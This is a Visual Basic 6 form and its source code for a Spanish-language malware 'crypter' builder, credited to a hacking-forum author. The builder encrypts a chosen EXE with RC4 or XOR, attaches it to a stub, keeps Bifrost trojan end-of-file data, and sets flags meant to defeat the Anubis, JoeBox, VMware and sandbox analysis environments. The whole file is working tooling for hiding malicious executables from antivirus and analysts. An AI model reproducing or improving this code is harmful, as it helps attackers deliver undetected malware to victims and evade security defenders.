VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000007&
   BorderStyle     =   5  'Sizable ToolWindow
   Caption         =   "[W]HITE~[R]00T Easy Crypter!"
   ClientHeight    =   7560
   ClientLeft      =   2010
   ClientTop       =   1680
   ClientWidth     =   7005
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7560
   ScaleWidth      =   7005
   ShowInTaskbar   =   0   'False
   Begin MSComDlg.CommonDialog CD 
      Left            =   6360
      Top             =   2280
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00000000&
      Caption         =   "Crypter"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000C000&
      Height          =   5295
      Left            =   120
      TabIndex        =   1
      Top             =   2160
      Width           =   6755
      Begin VB.Frame Frame5 
         BackColor       =   &H80000012&
         Caption         =   "Bifrost"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000C000&
         Height          =   615
         Left            =   120
         TabIndex        =   15
         Top             =   4320
         Width           =   1095
         Begin VB.CheckBox Check4 
            BackColor       =   &H80000012&
            Caption         =   "EOF"
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   120
            TabIndex        =   16
            Top             =   240
            Width           =   735
         End
      End
      Begin VB.Frame Frame4 
         BackColor       =   &H80000012&
         Caption         =   "Encriptaciones"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000C000&
         Height          =   1215
         Left            =   3480
         TabIndex        =   8
         Top             =   3000
         Width           =   3135
         Begin VB.OptionButton Option2 
            BackColor       =   &H80000012&
            Caption         =   "XOR"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   2160
            TabIndex        =   14
            Top             =   600
            Width           =   735
         End
         Begin VB.OptionButton Option1 
            BackColor       =   &H80000012&
            Caption         =   "RC4"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   360
            TabIndex        =   13
            Top             =   600
            Value           =   -1  'True
            Width           =   735
         End
      End
      Begin VB.Frame Frame3 
         BackColor       =   &H80000007&
         Caption         =   "Anti-Debuggin"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000C000&
         Height          =   1215
         Left            =   120
         TabIndex        =   7
         Top             =   3000
         Width           =   3015
         Begin VB.CheckBox Check5 
            BackColor       =   &H00000000&
            Caption         =   "anti-SandBox"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   1560
            TabIndex        =   12
            Top             =   840
            Width           =   1335
         End
         Begin VB.CheckBox Check3 
            BackColor       =   &H00000000&
            Caption         =   "anti-JoeBox"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   120
            TabIndex        =   11
            Top             =   840
            Width           =   1335
         End
         Begin VB.CheckBox Check2 
            BackColor       =   &H00000000&
            Caption         =   "anti-VMWare"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   1560
            TabIndex        =   10
            Top             =   480
            Width           =   1335
         End
         Begin VB.CheckBox Check1 
            BackColor       =   &H00000000&
            Caption         =   "anti-Anubis"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   120
            TabIndex        =   9
            Top             =   480
            Width           =   1335
         End
      End
      Begin VB.Frame Frame2 
         BackColor       =   &H80000012&
         Caption         =   "Archivo"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000C000&
         Height          =   2415
         Left            =   120
         TabIndex        =   2
         Top             =   360
         Width           =   6495
         Begin Proyecto1.Button cmdBuscar 
            Height          =   495
            Left            =   5400
            TabIndex        =   17
            Top             =   720
            Width           =   975
            _ExtentX        =   1720
            _ExtentY        =   873
            ButtonStyle     =   7
            BackColor       =   14211288
            BackColorPressed=   15715986
            BackColorHover  =   16243621
            BorderColor     =   9408398
            BorderColorPressed=   6045981
            BorderColorHover=   11632444
            Caption         =   "...."
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.TextBox Text2 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Bionic Type"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Left            =   240
            TabIndex        =   4
            Top             =   1800
            Width           =   4935
         End
         Begin VB.TextBox Text1 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Bionic Type"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Left            =   240
            TabIndex        =   3
            Top             =   840
            Width           =   4935
         End
         Begin Proyecto1.Button cmdGenerar 
            Height          =   495
            Left            =   5400
            TabIndex        =   18
            Top             =   1680
            Width           =   975
            _ExtentX        =   1720
            _ExtentY        =   873
            ButtonStyle     =   7
            BackColor       =   14211288
            BackColorPressed=   15715986
            BackColorHover  =   16243621
            BorderColor     =   9408398
            BorderColorPressed=   6045981
            BorderColorHover=   11632444
            Caption         =   "Rnd"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.Label Label2 
            BackColor       =   &H80000012&
            Caption         =   "ARCHIVO"
            BeginProperty Font 
               Name            =   "Bionic Type"
               Size            =   15.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   2280
            TabIndex        =   6
            Top             =   360
            Width           =   1335
         End
         Begin VB.Line Line8 
            BorderColor     =   &H80000009&
            X1              =   120
            X2              =   120
            Y1              =   720
            Y2              =   1200
         End
         Begin VB.Line Line7 
            BorderColor     =   &H80000009&
            X1              =   120
            X2              =   5280
            Y1              =   1200
            Y2              =   1200
         End
         Begin VB.Line Line6 
            BorderColor     =   &H80000009&
            X1              =   5280
            X2              =   5280
            Y1              =   720
            Y2              =   1200
         End
         Begin VB.Line Line5 
            BorderColor     =   &H80000009&
            X1              =   120
            X2              =   5280
            Y1              =   720
            Y2              =   720
         End
         Begin VB.Line Line4 
            BorderColor     =   &H80000009&
            X1              =   120
            X2              =   120
            Y1              =   1680
            Y2              =   2160
         End
         Begin VB.Line Line3 
            BorderColor     =   &H80000009&
            X1              =   120
            X2              =   5280
            Y1              =   2160
            Y2              =   2160
         End
         Begin VB.Line Line2 
            BorderColor     =   &H80000009&
            X1              =   5280
            X2              =   5280
            Y1              =   1680
            Y2              =   2160
         End
         Begin VB.Line Line1 
            BorderColor     =   &H80000009&
            X1              =   120
            X2              =   5280
            Y1              =   1680
            Y2              =   1680
         End
         Begin VB.Label Label1 
            BackColor       =   &H80000012&
            Caption         =   "KEY"
            BeginProperty Font 
               Name            =   "Bionic Type"
               Size            =   15.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   2640
            TabIndex        =   5
            Top             =   1320
            Width           =   615
         End
      End
      Begin Proyecto1.Button cmdCrear 
         Height          =   615
         Left            =   2520
         TabIndex        =   19
         Top             =   4440
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   1085
         ButtonStyle     =   7
         BackColor       =   14211288
         BackColorPressed=   15715986
         BackColorHover  =   16243621
         BorderColor     =   9408398
         BorderColorPressed=   6045981
         BorderColorHover=   11632444
         Caption         =   "Encriptar!"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin Proyecto1.Button Button1 
         Height          =   375
         Left            =   5400
         TabIndex        =   20
         Top             =   4800
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   661
         ButtonStyle     =   7
         BackColor       =   14211288
         BackColorPressed=   15715986
         BackColorHover  =   16243621
         BorderColor     =   9408398
         BorderColorPressed=   6045981
         BorderColorHover=   11632444
         Caption         =   "About"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
   Begin VB.PictureBox Picture1 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   2175
      Left            =   0
      Picture         =   "Form1.frx":D626
      ScaleHeight     =   2175
      ScaleWidth      =   7005
      TabIndex        =   0
      Top             =   0
      Width           =   7005
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False


'//->DECLARACIONES
Const a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const B = "abcdefghijklmnopqrstuvwxyz"
Const C = "1234567890"


'//->RANDOMIZE
Public Function sRandom()
Dim zeichen As String
Dim i As Integer

zeichen = a + B + C

For i = 1 To 50
    sRandom = sRandom & Mid$(zeichen, Int((Rnd * Len(zeichen)) + 1), 1)
Next i
End Function

'=====================================================================================
'=====================================================================================
'======================== Crypter Creado por [W]HITE~[R]00T ==========================
'================ Para Indetectables.net & Professional-Hacker.org ===================
'================= Greets to: HaX991, DARK_J4V13R, Xa0s, ~V~, dSR ====================
'Aprende del Código, usalo y no hagas RIP's ni el Lammer. Recuerda siempre dar las gra-
'cias y poner Autor y fuente si no lo has hecho tu!, Visita las webs mencionadas. Salu2
'=====================================================================================
'=====================================================================================

'/////////////////////////////////////////////////////////////////////////////////////
'=================== CON TEMOR A DIOS, Y SIN MIEDO AL HOMBRE! ========================
'/////////////////////////////////////////////////////////////////////////////////////





'//-> MOSTRAR EL ABOUT
Private Sub Button1_Click()
MsgBox "Click en la Ventana del About para cerrarla y no quede ejecutandose ;-) ", vbInformation, Me.Caption
frmAbout.Show
End Sub

'//->KEY
Private Sub cmdGenerar_Click()
Text2.Text = sRandom
End Sub

'//->BUSCAR EL ARCHIVO
Private Sub cmdBuscar_Click()
With CD
    .DialogTitle = "Seleccione el Archivo a Encriptar"
    .Filter = "Aplicaciones EXE|*.exe"
    .ShowOpen
End With

If Dir(CD.FileName) = vbNullString Then Exit Sub
Text1.Text = CD.FileName
End Sub

'//->ENCRIPTAR
Private Sub cmdCrear_Click()

Dim Stub As String

If Text1.Text = vbNullString Then
    MsgBox "El Archivo no se ha cargado!", vbInformation, Me.Caption
    Exit Sub
End If

With CD
    .DialogTitle = "Seleccione la ruta donde desea guardar el Archivo"
    .Filter = "Aplicaciones EXE|*.exe"
    .ShowSave
End With


'//////////////////////////////////////////////////////////////////////////////

Open App.Path & "\" & "Stub.dll" For Binary As #1
    Stub = Space(LOF(1))
    Get #1, , Stub
Close #1


Dim EOF As String

If Check4.Value = 1 Then EOF = ReadEOFData(Text1.Text)

Dim Bin As String

Open Text1.Text For Binary As #1
    Bin = Space(LOF(1))
    Get #1, , Bin
Close #1

Dim RC4 As New clsRC4, xXor As New clsXOR
Dim Encriptacion As String

If Option1.Value = True Then
    Bin = RC4.EncryptString(Bin, Text2.Text)
    Encriptacion = "RC4"
End If

If Option2.Value = True Then
    Bin = xXor.EncryptString(Bin, Text2.Text)
    Encriptacion = "XOR"
End If


Dim Datos As String

Datos = Stub & "[W]HITE" & Bin & "[W]HITE" & Encriptacion & "[W]HITE" & Text2.Text & "[W]HITE"

Dim DAtos2 As String

DAtos2 = Check1.Value & "GraciasDARK_J4V13R" & Check3.Value & "GraciasDARK_J4V13R" & Check2.Value & "GraciasDARK_J4V13R" & Check5.Value & "GraciasDARK_J4V13R"

Open CD.FileName For Binary As #1
    Put #1, , Datos & "GraciasDARK_J4V13R"
    Put #1, , DAtos2 '<<< Lo bueno esque CrypterByDARK_J4V13R sale si lo abris en hex :D asi todos sabran que yo te ayude :D ¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬
Close #1


If Check4.Value = 1 Then Call WriteEOFData(CD.FileName, EOF)

End Sub
'//////////////////////////////////////////////////////////////////////////////
